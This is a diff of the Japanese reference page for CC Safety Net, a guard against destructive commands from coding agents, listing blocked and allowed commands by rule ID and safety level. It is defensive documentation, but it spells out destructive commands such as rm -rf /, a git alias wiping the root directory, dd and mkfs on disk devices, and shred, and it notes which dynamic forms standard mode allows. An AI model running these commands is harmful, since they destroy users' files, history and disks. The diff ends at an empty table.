@@ -1,394 +1,422 @@
 ---
-title: "ブロックされるコマンドと理由"
-sidebarTitle: "ブロックされるコマンド"
-description: "CC Safety Net がブロックする Git、rm、find、デバイス系、PowerShell、cmd、機密パスのコマンドと、各ルールに必要な安全レベルを一覧するリファレンスです。"
+title: "ブロックされるコマンドと許可されるコマンド"
+sidebarTitle: "ブロックされるコマンドと許可されるコマンド"
+description: "CC Safety Net がブロックまたは許可する git、rm、find、ディスク、PowerShell、cmd、シェルのコマンドの一覧です。各ブロックのルール ID、必要な安全レベル、ブロックされたコマンドを許可する方法を示します。"
 keywords:
   - "ブロックされるコマンド"
+  - "許可されるコマンド"
   - "危険なコマンド"
   - "破壊的コマンド"
-  - "deny list"
+  - "安全なコマンド"
+  - "ルール ID"
+  - "ブロックされたコマンドを許可する"
+  - "destructive_command_protection.overrides"
+  - "致命的なルール"
+  - "固定の拒否 ID"
   - "rm -rf"
   - "git reset --hard"
-  - "git clean -fdx"
   - "git push --force"
-  - "find delete"
+  - "GIT_SSH_COMMAND"
+  - "curl | sh"
   - "xargs rm"
   - "dd mkfs shred"
   - "Remove-Item"
+  - "WhatIf"
   - "Git メタデータ保護"
   - "policy.json 保護"
 ---
 
-ここに挙げるコマンドは、未コミットの変更、stash に退避した作業、リモートの履歴、ディスク全体を失う可能性があるため、ブロックされます。次の表は既定の組み込みルールです。[カスタムルール](/ja/configuration/custom-rules)で拡張できます。
+CC Safety Net は、未コミットの変更、スタッシュに退避した作業、リモートの履歴、ディスクを完全に失わせるおそれのあるコマンドをブロックし、同じコマンドでも安全な書き方は許可します。以下の各表には、コマンド、[安全レベル](/ja/configuration/modes)ごとの結果、ルール ID を示します。ルール ID は、ブロックメッセージ、[監査ログ](/ja/reference/audit-log)、`explain --json` に表示されるものです。`cat .env` のようなファイルの読み取りは[シークレット保護](/ja/reference/secret-protection)の対象です。独自のブロックは[カスタムルール](/ja/configuration/custom-rules)で追加できます。
 
-既定では、マークのないすべての行を 3 つの安全レベルでブロックします。**Strict** または **Paranoid** と記載した行には、その安全レベルまたは機能が必要です。すべてのルール ID と、致命的でないルールを無効にする方法は、[破壊的コマンドルールのリファレンス](/ja/reference/destructive-rules)にあります。各レベルを有効にする方法については、[モード](/ja/configuration/modes)を参照してください。
+「結果」列の値の意味は次のとおりです。
 
-このページは、ブロックされる操作と、その境界の一覧です。ガードの処理順は[アーキテクチャ](/ja/guides/architecture)、分類処理の詳細は[解析エンジン](/ja/guides/analysis-engine)、許可される書き方は[許可されるコマンド](/ja/reference/allowed-commands)を参照してください。
-
-## 各レベルが追加するブロック
-
-| レベル | 追加するブロック |
+| 結果 | 意味 |
 | --- | --- |
-| [standard](/ja/configuration/modes#default-mode) | 印の付いていない行をすべてブロックします。`echo 'unterminated` のように安全に見える解析不能なテキストは許可しますが、認識できる破壊的パターンを含む解析不能なテキストは、ヒューリスティックによって引き続きブロックします。[パーサーが拒否するシェル構文](/ja/guides/analysis-engine#shell-syntax-the-parser-refuses)も、このレベルでブロックします。動的な `rm -rf` の対象は一律にはブロック**しません**。 |
-| [strict](/ja/configuration/modes#strict-mode) | standard がブロックする形式すべてに加えて、解析できないコマンドを一律にブロックし、検証できない破壊的対象、[限られた対応形式から外れる heredoc](#heredocs-in-strict-and-paranoid)、組み込みの機密パスに対するメタデータのみの探索もブロックします。 |
-| [paranoid](/ja/configuration/modes#paranoid-mode) | strict がブロックする形式すべてに加えて、カレントディレクトリ配下であっても一時パス以外への再帰的な削除（`rm -r`、`rm -rf`、`find -delete`、`Remove-Item -Recurse -Force`、`cmd /c rmdir /s`）をブロックし、内容にかかわらずすべてのインタープリター 1 行コードをブロックします。 |
+| ブロック | すべての安全レベルでブロック。そのルール ID に `"off"` のオーバーライドを指定すれば許可される。ただし、ID が[固定の拒否 ID](#fixed-denial-ids) の場合は除く |
+| 致命的 | どのポリシーでも、すべての安全レベルでブロック。[致命的なルール](#catastrophic-rules)を参照 |
+| Standard のみ | standard では許可、strict と paranoid ではブロック |
+| Strict | strict と paranoid ではブロック、standard では許可 |
+| Paranoid rm | [paranoid の rm チェック](/ja/configuration/modes#rm-check-cc_safety_net_paranoid_rm=1)を有効にするとブロック |
+| 許可 | すべての安全レベルで許可 |
 
-<Note>
-  一部の重要な保護は、選択した安全レベルに依存しません。root とホームディレクトリの再帰削除、Git メタデータの保護、正規の `policy.json` の保護は、破壊的コマンドのマスタースイッチも、ルール単位の `off` の override も無視します。
-</Note>
+<span id="allow-a-blocked-command"></span>
 
-<Note>
-  以下の拒否のうち 2 つは、Claude Code のフックではブロックではなく権限確認のプロンプトになります。`raw-text.dangerous-command` に一致した場合と、理由が `shell execution source cannot be verified safely.` の拒否です。これはフェイルクローズの機能が無効な場合、つまり standard レベルに限られ、さらに permission mode が `default`、`acceptEdits`、`plan`、`auto` のいずれかの場合だけです。strict と paranoid、および他のすべてのホストは拒否します。拒否のままになる 2 つのケースは、[Claude Code が拒否ではなく確認を求める場合](/ja/guides/integration-architecture#when-claude-code-asks-instead-of-denying)を参照してください。
-</Note>
+## ブロックされたコマンドを許可する
 
-<span id="git-commands"></span>
+そのコマンドをブロックしているルールを無効にします。[致命的なルール](#catastrophic-rules)と[固定の拒否 ID](#fixed-denial-ids) 以外のすべてのルールに使える方法です。
+
+<Steps>
+  <Step title="ルール ID を確認する">
+    ルール ID はブロックメッセージに表示されます。対象のコマンドそのものに `explain` を実行し、`ruleId` を読み取ることもできます。
+
+    ```bash
+    npx -y cc-safety-net explain --json 'git push --force origin main'
+    ```
+  </Step>
+  <Step title="off のオーバーライドを追加する">
+    `policy.json` の `destructive_command_protection.overrides` に、その ID を値 `"off"` で追加します。ユーザーファイルはすべてのプロジェクトに、`.cc-safety-net/policy.json` はそのプロジェクトだけに適用されます。次の内容を既存のファイルにマージしてください。
+
+    ```json
+    {
+      "version": 1,
+      "destructive_command_protection": {
+        "overrides": {
+          "git.push-force": "off"
+        }
+      }
+    }
+    ```
+  </Step>
+  <Step title="変更を確認する">
+    もう一度 `explain` を実行します。コマンドが許可と表示され、`status` にはそのオーバーライドが一覧表示されます。
+  </Step>
+</Steps>
+
+オーバーライドで無効になるのはルール全体であり、特定のコマンド 1 つではありません。逆に `"on"` を指定すると、安全レベルでは無効になっているルールを有効にできます。standard での `rm.recursive-force-paranoid` がその例です。登録されていない ID は `policy check` が拒否します。フィールドの書き方は[ポリシー](/ja/configuration/policy#destructive-command-protection)を参照してください。
+
+ルールを無効にせず、特定のディレクトリ配下の再帰削除だけを許可するには、[`allow_paths`](#recursive-deletes-under-allow_paths) を使います。保護対象のファイルの読み取りを許可する方法は、[ブロックされたファイルを許可する](/ja/reference/secret-protection#allow-a-blocked-file)を参照してください。
+
+## ルールを確認プロンプトに設定することはできない
+
+オーバーライドに指定できる値は `"on"` と `"off"` だけです。ブロックの代わりに承認を求めるようルールを設定する方法はありません。唯一の例外は組み込みの動作です。Claude Code の standard レベルでは、2 種類の拒否が権限確認のプロンプトになります。[Claude Code がブロックせずに確認を求める場合](/ja/installation/claude-code#when-claude-code-asks-you-instead-of-blocking)を参照してください。
+
+<span id="what-each-safety-level-adds"></span>
+
+## 各安全レベルで追加されるブロック
+
+| レベル | 変わること |
+| --- | --- |
+| [Standard](/ja/configuration/modes#default-mode) | 結果が「ブロック」と「致命的」の行をすべてブロックする。「Standard のみ」の行は許可する。対象は、動的な削除対象、動的な実行ファイル、安全に見える解析不能なテキスト、リテラルのローカル生成コマンド 1 つに対する `eval` |
+| [Strict](/ja/configuration/modes#strict-mode-cc_safety_net_strict=1) | さらに「Standard のみ」の行、解析できないすべてのコマンド、限られた対応形式から外れる [heredoc](#heredocs) もブロックする |
+| [Paranoid](/ja/configuration/modes#paranoid-mode-cc_safety_net_paranoid=1) | さらに、作業ディレクトリ内でも一時パス以外への再帰削除をブロックし、インタープリターのワンライナーを内容にかかわらずすべてブロックする |
+
+アナライザーの再帰の上限や構造の上限を超えるコマンドは、standard を含むすべてのレベルで拒否されます。
+
+<span id="catastrophic-rules"></span>
+
+## 致命的なルール
+
+致命的なルールは 10 個あります。対象は、`/` またはホームディレクトリの再帰削除、Git メタデータの削除、そして CC Safety Net が対象を安全に読み取れない 2 種類の再帰削除です。以下の表では「致命的」と表示しています。
+
+致命的なルールは `destructive_command_protection.enabled: false` も `"off"` のオーバーライドも無視するため、どのポリシーでも、すべての安全レベルでブロックします。緩和も一切適用されません。`allow_paths`、[ワークツリーモード](/ja/configuration/modes#worktree-mode-cc_safety_net_worktree=1)、一時リポジトリの緩和、「Standard のみ」の許可のいずれがあっても、ブロックは維持されます。本来そのコマンドを捕捉するルールが無効になっていても、致命的な対象はそれ自身のルールでブロックされます。そのため `parallel rm -rf ::: /` は、`rm.recursive-force-root-or-home` として引き続きブロックされます。
+
+[Git メタデータ](#git-metadata)と [policy.json](#protected-policy-json-files) のガードも同じ扱いです。どちらも設定を読み込む前に実行されるため、どの設定でも無効にできません。
 
 ## Git コマンド
 
-次の Git 操作は、未コミットの作業を破棄する、復旧に必要な履歴を壊す、共有された状態を書き換える、といった理由でブロックします。
+| コマンド | 結果 | ルール ID |
+| --- | --- | --- |
+| `git checkout -- <files>` | ブロック | `git.checkout-double-dash` |
+| `git checkout <path>`（`git checkout .` や `git checkout src/app.ts` など） | ブロック | `git.checkout-double-dash` |
+| `git checkout <branch>` | 許可 | |
+| `git checkout -b`、`-B`、`--orphan`、`-d` / `--detach`、`-t` / `--track` | 許可 | |
+| `git checkout --force` / `-f` | ブロック | `git.checkout-force` |
+| `git checkout <ref> -- <path>` | ブロック | `git.checkout-ref-path` |
+| `git checkout <ref> <path>` | ブロック | `git.checkout-ambiguous` |
+| `git checkout --pathspec-from-file=paths.txt` | ブロック | `git.checkout-pathspec-from-file` |
+| `git restore <files>` | ブロック | `git.restore-unstaged` |
+| `git restore --worktree` / `-W` | ブロック | `git.restore-worktree` |
+| `git restore --staged` | 許可 | |
+| `git switch --discard-changes` | ブロック | `git.switch-discard-changes` |
+| `git switch --force` / `-f` | ブロック | `git.switch-force` |
+| `git reset --hard` | ブロック | `git.reset-hard` |
+| `git reset --merge` | ブロック | `git.reset-merge` |
+| `git clean -f` / `--force` | ブロック | `git.clean-force` |
+| `git clean -n` / `--dry-run` | 許可 | |
+| `git rm --force` / `-f` | ブロック | `git.rm-force` |
+| `git rm <files>`、`git rm --cached`、`git rm --dry-run` / `-n` | 許可 | |
+| `git push --force` / `-f` | ブロック | `git.push-force` |
+| `git push --force-with-lease` | 許可 | |
+| `git push --delete origin old-branch` | ブロック | `git.push-delete` |
+| `git push --mirror` | ブロック | `git.push-mirror` |
+| `git branch -D` | ブロック | `git.branch-force-delete` |
+| `git branch -d` | 許可 | |
+| `git rebase --abort` | ブロック | `git.rebase-abort` |
+| `git merge --abort` | ブロック | `git.merge-abort` |
+| `git tag -d` / `--delete` | ブロック | `git.tag-delete` |
+| `git reflog delete` | ブロック | `git.reflog-delete` |
+| `git stash drop` | ブロック | `git.stash-drop` |
+| `git stash clear` | ブロック | `git.stash-clear` |
+| `git worktree remove --force` | ブロック | `git.worktree-remove-force` |
+| `git -c alias.wipe='!rm -rf /' wipe` | ブロック | `git.alias-config` |
+| `GIT_SSH_COMMAND=... git push` | ブロック | `git.ssh-env` |
 
-| コマンド形式 | ブロックする理由 |
-| --- | --- |
-| `git checkout -- <files>` | 未コミット変更を永久に破棄する |
-| `git checkout <path>` | `--` を挟まない同じ復元。`git checkout .`、`git checkout src/`、`git checkout src/app.ts` など |
-| `git checkout --force` / `-f` | 未コミット変更を強制的に破棄する |
-| `git checkout <ref> -- <path>` | ref の内容で作業ツリーを上書きする |
-| `git checkout <ref> <path>` | Git が ref と pathspec を判別する際に上書きする可能性がある |
-| `git checkout --pathspec-from-file` | ファイル一覧から複数ファイルを上書きできる |
-| `git restore <files>` | 作業ツリーの変更を破棄する。ステージングの解除だけなら `--staged` を使う |
-| `git restore --worktree` / `-W` | 作業ツリーの変更を明示的に破棄する |
-| `git switch --discard-changes` | ブランチ切り替え時に未コミットの変更を破棄する |
-| `git switch --force` / `-f` | 未コミットの変更を破棄する（強制的な切り替え） |
-| `git reset --hard` | すべての未コミット変更を削除する |
-| `git reset --merge` | 未コミット変更を失う可能性がある |
-| `git clean -f` / `--force` | 未追跡ファイルを永久に削除する |
-| `git rm --force` / `-f` | 追跡中のファイルを作業ツリーから削除する。`--cached` と `--dry-run` / `-n` はブロックしない。フラグなしの `git rm` も、git 自身の安全確認によって `HEAD` から復元できる内容に限られるため許可する |
-| `git push --force` / `-f` | リモート履歴を破壊する。`--force-with-lease` を使う |
-| `git branch -D` | マージ済みかを確認せずにブランチを強制削除する |
-| `git rebase --abort` | rebase 中に解決したコンフリクトの内容を破棄する |
-| `git merge --abort` | マージ中に解決したコンフリクトの内容を破棄する |
-| `git tag -d` / `--delete` | タグを完全に削除する |
-| `git reflog delete` | 復旧履歴を削除する |
-| `git stash drop` | stash に退避した変更を完全に削除する |
-| `git stash clear` | stash に退避した変更をすべて削除する |
-| `git worktree remove --force` | 変更の有無を確認せずにワークツリーを削除する |
+フラグなしの `git rm` は許可されます。`HEAD` から復元できない変更の削除は、Git 自身が拒否するためです。
 
-位置引数が 1 つだけの `git checkout <operand>` も、同じルール `git.checkout-double-dash` でパスの復元として扱います。判定の条件は、オペランドがパスの形（`.`、`..`、`./…`、`../…`、絶対パス、ドライブレター付きのパス、末尾のスラッシュ、`:` で始まる magic pathspec）であること、`*`、`?`、`[` を含むこと、解決後の git の作業ディレクトリに実在するエントリを指していること、のいずれかです。`main` や `feature/x` のような素のブランチ名は引き続き許可され、`-b`、`-B`、`--orphan`、`-d` / `--detach`、`-t` / `--track` もブロックしません。解析では git のサブプロセスを起動せず、ref の解決もしません。そのため、実在するファイルやディレクトリと同じ名前のブランチはブロックされ、メッセージは `git switch` を案内します。
+位置引数が 1 つだけの `git checkout <operand>` は、オペランドがパスの形（`.`、`./…`、`../…`、絶対パス、末尾のスラッシュ、glob）で書かれている場合か、実在するファイルやディレクトリを指している場合に、パスの復元として扱います。`main` のような素のブランチ名は許可されたままです。ブランチとファイルが同じ名前の場合はブロックされ、メッセージは `git switch` を案内します。`git switch` がパスを復元することはありません。
 
-強制フラグと、ブランチの作成・リセットのフラグを両方使ってブランチを変更する Git コマンド（`git checkout -Bf`、`git switch -Cf --discard-changes` など）は、ブランチの強制リセットとみなしてブロックします。
+[ワークツリーモード](/ja/configuration/modes#worktree-mode-cc_safety_net_worktree=1)を有効にすると、上の表のうちローカルの変更を破棄する行は、検証済みのリンクされたワークツリー内では許可されます。
 
-<span id="git-ssh-environment-overrides"></span>
+### GIT_SSH_COMMAND はブロックされますか？
 
-### Git の SSH 関連の環境変数による上書き
+コマンド自体が設定している場合だけブロックされます。`git.ssh-env` は、コマンドラインで `GIT_SSH_COMMAND`、`GIT_SSH`、`GIT_SSH_VARIANT` を設定するか、`git -c` や `GIT_CONFIG_*` で `core.sshCommand` を設定したうえで、Git のネットワークコマンド（`clone`、`fetch`、`pull`、`push`、`ls-remote`、`submodule`）を実行するものをブロックします。これらはいずれも、ネットワーク操作中に任意のプログラムを実行できるためです。
 
-Git は、ネットワーク操作中に任意のプログラムを実行するために `GIT_SSH_COMMAND` と `GIT_SSH` を、そのプログラムの呼び出し方を変えるために `GIT_SSH_VARIANT` を使えます。ルール `git.ssh-env` は、これらの変数、または `-c` や `GIT_CONFIG_*` による `core.sshCommand` を設定したうえでネットワーク系のサブコマンド（`clone`、`fetch`、`pull`、`push`、`ls-remote`、`submodule`）を実行するコマンドをブロックします。
+| コマンド | 結果 | ルール ID |
+| --- | --- | --- |
+| `GIT_SSH_COMMAND="ssh -i ~/.ssh/deploy" git clone <url>` | ブロック | `git.ssh-env` |
+| `GIT_SSH=./wrapper git fetch` | ブロック | `git.ssh-env` |
+| `git -c core.sshCommand=... push` | ブロック | `git.ssh-env` |
+| シェルのプロファイルで `GIT_SSH_COMMAND` を export した状態での `git push` | 許可 | |
 
-| ブロックする形式 | ブロックする理由 |
-| --- | --- |
-| `GIT_SSH_COMMAND=... git clone` | SSH の上書きにより、ネットワーク操作中に任意のコマンドを実行できてしまう |
-| `GIT_SSH=... git fetch` / `pull` / `push` | 同じ理由。fetch、pull、push が対象 |
-| `GIT_SSH_VARIANT=... git ls-remote` / `submodule` | Git が SSH プログラムに渡す引数の形式を変更する |
-| `git -c core.sshCommand=... push` | 環境変数ではなく Git の設定で同じ上書きを行う |
+許可するには、エージェントを起動する前にシェルのプロファイルで変数を export するか、[ブロックされたコマンドを許可する](#allow-a-blocked-command)の手順で `"git.ssh-env": "off"` を指定してルールを無効にします。このルールは致命的なルールではありません。
 
-対象になるのは、コマンドラインで設定した上書きだけです。エージェントの起動前にシェルのプロファイルで export した `GIT_SSH_COMMAND` はユーザー自身の選択であり、`git fetch`、`git pull`、`git push` をブロックしません。
+<span id="git-commands-in-a-temp-repository"></span>
 
-このルールは catastrophic ではないため、他の組み込みルールと同じ方法で無効にできます。[組み込みルールを許可する](/ja/reference/destructive-rules#allow-a-built-in-rule)を参照してください。
+### 一時リポジトリでの Git コマンド
+
+`/tmp` のような一時ディレクトリ配下の使い捨てリポジトリでは、変更を破棄する Git コマンドが許可されます。ただし、そのリポジトリがワークスペースそのものでも、ワークスペースの中でもない場合に限ります。たとえば `cd /tmp/scratch && git reset --hard` は実行できます。`git.push-*`、`git.ssh-env`、`git.alias-config` のルールはこの方法では緩和されず、[`allow_paths`](#recursive-deletes-under-allow_paths) でも範囲は広がりません。
 
 <span id="filesystem-commands"></span>
 
 ## ファイルシステムコマンド
 
-| コマンド形式 | ブロックする理由 | レベル |
+`rm -rf` の各行は、同じルール ID で `rm -r`、`rm -R`、`rm --recursive` にも当てはまります。
+
+| コマンド | 結果 | ルール ID |
 | --- | --- | --- |
-| `rm -rf /`, `~`, `$HOME` | ルートまたはホームを削除する | すべて、重大 |
-| `rm -rf .git` と保護対象のフック | リポジトリの履歴とフックを破壊する | すべて、致命的 |
-| `rm -rf .` | 現在の作業ディレクトリ自体を削除する | すべて |
-| カレントディレクトリ外への `rm -rf` | 作業領域の外にある絶対パス、親ディレクトリ、一時パス以外を削除する | すべて |
-| カレントディレクトリがホームの状態での `rm -rf` | ホームディレクトリを基準にした再帰削除は危険 | すべて |
-| `rm -rf "$target"` | 動的な対象は実行前に検証できない | **strict**、paranoid |
-| `rm -rf ./cache` | カレントディレクトリ配下でも、一時パス以外への再帰的な削除を制限する | **paranoid**（[`CC_SAFETY_NET_PARANOID_RM=1`](/ja/configuration/modes#paranoid-rm-check)） |
-| `cleanup() { rm -rf ../outside; }; cleanup` | 呼び出されたシェル関数の本体を、呼び出し位置で解析する。定義しただけでは何も実行されない | すべて |
-| `find . -delete`、またはカレントディレクトリ外にある一時パス以外の起点 | 条件に一致したファイルを完全に削除する（事前確認には `-print` を使う） | すべて |
-| `find ./cache -delete`（カレントディレクトリ配下の一時パス以外の起点） | `find -delete` に対するカレントディレクトリ配下の許可は `rm.recursive-force-paranoid` に従うため、`rm -rf ./cache` がブロックされる条件では `find.delete` としてブロックする | **paranoid**（[`CC_SAFETY_NET_PARANOID_RM=1`](/ja/configuration/modes#paranoid-rm-check)） |
-| `find .git -delete` | 保護対象の Git メタデータを削除対象にする。`find.delete-git-metadata` が `off` でも重大な操作としてブロックする | すべて、重大 |
-| `find -exec rm -rf ...` | `find` 内で再帰強制削除を実行する | すべて |
-| `xargs rm -rf` | 動的入力のため対象を予測できない | すべて |
-| `xargs <shell> -c` | 任意のコマンドを実行できる | すべて |
-| `parallel rm -rf` | 動的入力のため対象を予測できない | すべて |
-| `parallel <shell> -c` | 任意のコマンドを実行できる | すべて |
+| `rm -rf /`、`rm -rf ~`、`rm -rf $HOME` とその配下 | 致命的 | `rm.recursive-force-root-or-home` |
+| `rm -rf .git` とリポジトリのフックディレクトリ | 致命的 | `rm.git-metadata` |
+| `rm -rf .`（作業ディレクトリそのもの） | ブロック | `rm.recursive-force-cwd-self` |
+| `rm -rf ../outside` など、作業ディレクトリ外の一時パス以外 | ブロック | `rm.recursive-force-outside-cwd` |
+| 作業ディレクトリがホームのときの `rm -rf build` | ブロック | `rm.recursive-force-home-cwd` |
+| `rm -rf "$target"` など、変数や置換から組み立てた対象 | Strict | `rm.recursive-force-dynamic-target` |
+| `rm -rf ./cache`（作業ディレクトリ内の一時パス以外） | Paranoid rm | `rm.recursive-force-paranoid` |
+| `rm -rf /tmp/...`、`rm -rf /var/tmp/...`、`rm -rf $TMPDIR/...` | 許可 | |
+| 設定済みの許可パス配下に対する `rm -rf <path>` | 許可 | |
+| `cleanup() { rm -rf ../outside; }; cleanup` | ブロック | `rm.recursive-force-outside-cwd` |
+| `cleanup() { rm -rf ../outside; }`（定義のみで呼び出さない） | 許可 | |
+| `f() { rm -rf "$1"; }; f ~` | Standard のみ | `rm.recursive-force-dynamic-target` |
+| `find . -delete`、または作業ディレクトリ外の一時パス以外を起点とする `find` | ブロック | `find.delete` |
+| `find ./cache -delete`（作業ディレクトリ内） | Paranoid rm | `find.delete` |
+| `find .git -delete` | 致命的 | `find.delete-git-metadata` |
+| `find . -exec rm -rf {} +` | ブロック | `find.exec-rm-recursive-force` |
+| `printf / \| xargs rm -rf` | ブロック | `xargs.rm-recursive-force-dynamic` |
+| `find . -name '*.log' \| xargs -I{} sh -c 'rm -rf {}'` | ブロック | `xargs.shell-dynamic` |
+| `grep -rl TODO src \| xargs -I{} sh -c 'echo "--- {}"; head -3 {}'` | Standard のみ | `xargs.shell-dynamic` |
+| `printf / \| parallel rm -rf` | ブロック | `parallel.rm-recursive-force-dynamic` |
+| `parallel r$(printf m) -rf ::: child` | ブロック | `parallel.shell-dynamic` |
+| `parallel --dry-run` と、CC Safety Net が展開できない `parallel` の入力形式 | ブロック | `parallel.command-stream-dynamic` |
+| `awk '{ system($0) }'` | ブロック | `awk.system-dynamic` |
 
-再帰的な `rm` の対象は、`rm -rf` でも、`-f` のない `rm -r`、`rm -R`、`rm --recursive` でも、次の順に照合し、最初に一致した分類を採用します。
+CC Safety Net はシンボリックリンクを解決してからパスを比較します。そのため、`/` を指すシンボリックリンクは `/` として扱い、`/tmp-malicious` は一時パスとは見なしません。`-f` がなくても、見える範囲の対象は検査するため、`xargs rm -r ../other` は `rm.recursive-force-outside-cwd` としてブロックされます。シェル関数の本体は、関数を呼び出した位置で、呼び出し側の作業ディレクトリを基準に検査します。
 
-1. 未対応の Windows UNC またはデバイス名前空間の対象
-2. root またはホーム
-3. 保護対象の Git メタデータ
-4. 一時パス
-5. 動的な対象
-6. 設定済みの allow path
-7. カレントディレクトリがホームの場合
-8. カレントディレクトリそのもの
-9. カレントディレクトリ配下
-10. カレントディレクトリ外
+standard では、入力がコマンドの位置に来ることがなく、入力に `/` を代入しても無害なままの `xargs` のシェル本体は許可されます。`grep … | xargs` の行が通り、`rm -rf {}` の行が通らないのはこのためです。
 
-一時パスはすべてのレベルで許可します。カレントディレクトリ配下のパスは、paranoid の `rm` が有効でないかぎり許可します。上の表の `rm -rf` の行は、同じルール ID で `rm -r` にも当てはまります。たとえば `rm -r ../outside` は `rm.recursive-force-outside-cwd` としてブロックされます。安全な書き方は、[許可されるコマンド](/ja/reference/allowed-commands)を参照してください。
-
-`find -delete` も、各起点を同じ分類で判定します。シンボリックリンクを解決したうえで、すべての起点がカレントディレクトリ配下にあれば許可します。起点が `.` の場合、一時パス以外でカレントディレクトリの外にある場合、カレントディレクトリがホームの場合、`-L`、`-f`、`-follow` のいずれかを指定した場合は、`find.delete` としてブロックします。`find -exec rm -rf`、`xargs rm -rf`、`parallel rm -rf` のルールは、`-r` と `-f` の両方を条件とします。`-f` がなくても、エンジンは見える範囲の対象を分類するため、`xargs rm -r ../other` と `parallel rm -r ::: ../other` は `rm.recursive-force-outside-cwd` としてブロックされます。引用符で囲んだ `parallel` のコマンドはシェルを通して実行されるため、`parallel 'rm -rf {}' ::: ../other` も引用符なしの形式と同じくブロックされます。詳しくは[解析エンジン](/ja/guides/analysis-engine#dynamic-target-analyzers-for-find-xargs-and-parallel)を参照してください。
-
-破壊的コマンドをシェル関数に隠しても結果は変わりません。関数を呼び出した位置で、呼び出し側のカレントディレクトリを使って本体を解析します。呼び出しは、引用符付きの形式（`'cleanup'`）、`time`／`!` を前置した形式、`eval` 経由でも解決します。bash のキーワード形式 `function cleanup { ... }` と `function cleanup() { ... }` も定義として解釈するため、`cleanup() { ... }` と同じ扱いになります。呼び出されない定義は何も実行しません。呼び出しの解決とスコープについては、[POSIX シェル関数](/ja/guides/analysis-engine#posix-shell-functions)を参照してください。
+引用符のない glob は、対象を検査する前に展開します。作業ディレクトリがホームの場合、`rm -rf *` と `rm -rf ./*` は `rm.recursive-force-root-or-home` としてブロックされます。
 
 <Warning>
-  動的な `rm -rf` の対象は、standard では一律にブロックされません。`rm -rf "$target"` は standard では許可され、[strict](/ja/configuration/modes#strict-mode) または [paranoid](/ja/configuration/modes#paranoid-mode) でフェイルクローズの機能が有効になったときにだけブロックされます。standard は、敵対的な入力や動的に生成されたコマンド文字列に対してはベストエフォートです。コマンドがプロンプトインジェクションなど信頼できない経路から来る可能性がある場合は、strict または paranoid を使ってください。
+  standard は、動的な `rm -rf` の対象をブロックしません。`rm -rf "$target"` は standard では許可され、[strict](/ja/configuration/modes#strict-mode-cc_safety_net_strict=1) か [paranoid](/ja/configuration/modes#paranoid-mode-cc_safety_net_paranoid=1) でだけブロックされます。プロンプトインジェクションなど、信頼できない経路からコマンドが来る可能性がある場合は、どちらかのレベルを使ってください。
 </Warning>
 
-引用符のない glob は、この照合を行う前にカレントディレクトリを基準に展開されます。カレントディレクトリがホームディレクトリの場合、`rm -rf *` と `rm -rf ./*` はどちらもホームを対象とする分類になり、すべてのレベルで `rm.recursive-force-root-or-home` としてブロックされます。一方、引用符付きの `rm -rf '*'` は glob ではなく、`*` という名前のファイル 1 つを指します。ホームではこれも `rm.recursive-force-home-cwd` によってブロックされ、それ以外の場所では通常のリテラル対象として扱われます。
+<span id="recursive-deletes-under-allow_paths"></span>
 
-Git メタデータと動的な対象は、設定済みの allow path より先に分類されます。そのため、`destructive_command_protection.allow_paths` の項目によって Git メタデータの保護が緩和されることはなく、検証できない対象にも適用されません。
+### allow_paths 配下の再帰削除
 
-<span id="device-and-disk-destruction"></span>
+`rm`、PowerShell の `Remove-Item`、`find -delete` のルールは、`destructive_command_protection.allow_paths` に挙げたディレクトリを、すべての安全レベルで一時ディレクトリと同じように扱います。許可パスがルート、ホーム、Git メタデータ、動的な対象に及ぶことはありません。シークレット保護も Git の一時リポジトリの緩和も、許可パスでは緩和されません。指定できるエントリは[許可パス](/ja/configuration/policy#allow-paths)を参照してください。
 
-## デバイスとディスクの破壊
+## デバイスとディスクのコマンド
 
-CC Safety Net は、どの安全レベルでも `dd`、`mkfs`・`mke2fs`・`newfs` のフォーマッター、`shred`、`diskutil`、`wipefs`、`sgdisk`、`parted`、およびディスクデバイスへの出力リダイレクトを解析します。これらは致命的な操作のルールではないため、破壊的コマンドのマスタースイッチやルール単位の `off` の override を適用できます。
+CC Safety Net は、`dd`、`mkfs`、`mke2fs`、`newfs`、`shred`、`diskutil`、`wipefs`、`sgdisk`、`parted` と、ディスクへの出力リダイレクトを、すべての安全レベルで検査します。これらのルールはいずれも致命的なルールではありません。
 
-| コマンド形式 | ブロックする理由 |
-| --- | --- |
-| `dd ... of=/dev/...` | デバイスパスへの `dd` の直接書き込みは、ディスクやパーティションを破壊しうる。オペランドの順序を入れ替えた形や引用符で囲んだ形も対象（`dd of=/dev/nvme0n1 if=/dev/zero`、`of="/dev/sda"`） |
-| `mkfs /dev/...`、`mkfs.*` の各形式、`mke2fs /dev/...`、`/dev/...` に対する `newfs`・`newfs_*` | デバイスのフォーマットはすべてのデータを消去する（`mkfs.ext4 /dev/sda1`、`mkfs -t ext4 /dev/sdb`、`mke2fs -t ext4 /dev/sde`、`newfs_hfs /dev/disk2s1`） |
-| 消去系またはパーティション系のサブコマンドを伴う `diskutil` | `eraseDisk`、`eraseVolume`、`reformat`、`partitionDisk`、`zeroDisk`、`randomDisk`、`secureErase` はいずれも対象を破壊する。サブコマンドの照合は大文字小文字を区別せず、対象の書き方も問わないため、`diskutil erasedisk APFS X disk4` は `/dev/` のパスがなくてもブロックされる |
-| `/dev/...` を対象とする `wipefs -a` または `wipefs -o` | ファイルシステムのシグネチャを消すと、ディスクは読めなくなる（`wipefs -a /dev/sdb`、`wipefs --all /dev/sdb`、`wipefs -af /dev/sdb`、`wipefs --offset=0x438 /dev/sdb`） |
-| `/dev/...` を対象とし、書き込み系のオプションを伴う `sgdisk` | パーティションテーブルへの書き込みで、すべてのパーティションが失われうる（`sgdisk -Z /dev/sdc`、`sgdisk --zap-all /dev/sdd`、`sgdisk -n 1:0:0 /dev/sdd`）。`-Zo` や `-pZ` のようにまとめた短形式オプションは、すべての文字が読み取り専用のフラグではないためブロックされる |
-| `/dev/...` を対象とし、`mklabel`、`mktable`、`mkpart`、`rm`、`resizepart` のいずれかを伴う `parted` | どのサブコマンドもパーティションテーブルを書き換える（`parted /dev/sde mklabel gpt`、`parted -s /dev/sdf rm 3`）。照合は大文字小文字を区別しない |
-| 出力先がリテラルで書かれたディスクデバイスである出力リダイレクト | `echo x > /dev/sda` は `dd of=/dev/sda` と同じようにディスクを上書きする。`>`、`>\|`、`>>`、`<>`、`>&` のいずれも対象になるため、`printf x >> /dev/disk4` と `echo x &> /dev/sdb` もブロックされる |
-| `shred <target>` | `shred` は渡したものを永久に破壊するため、`shred --help` と `shred --version` を含むすべての対象をブロックする |
+| コマンド | 結果 | ルール ID |
+| --- | --- | --- |
